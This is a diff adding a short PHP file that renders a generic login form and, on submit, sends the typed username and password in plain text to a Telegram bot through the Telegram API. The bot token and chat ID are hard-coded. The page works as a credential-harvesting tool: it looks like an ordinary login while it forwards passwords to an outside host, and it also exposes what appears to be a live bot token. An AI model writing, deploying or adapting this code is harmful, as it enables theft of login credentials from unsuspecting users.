@@ -1,0 +1,31 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST["username"];
+    $password = $_POST["password"];
+
+    // Send data to Telegram bot
+    $telegramBotToken = "7114160434:AAHMMSjUmaxRFZU3w2c0KymiH33Fxcb8sKc";
+    $chatId = "669385516"; // Replace with your chat ID
+    $message = "New login attempt:\nUsername: $username\nPassword: $password";
+
+    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
+    file_get_contents($telegramApiUrl); // Send message to Telegram bot
+
+    echo "Login attempt sent to Telegram.";
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Form</title>
+</head>
+<body>
+    <h2>Login Form</h2>
+    <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">
+        Username: <input type="text" name="username"><br><br>
+        Password: <input type="password" name="password"><br><br>
+        <input type="submit" name="submit" value="Submit">
+    </form>
+</body>
+</html>
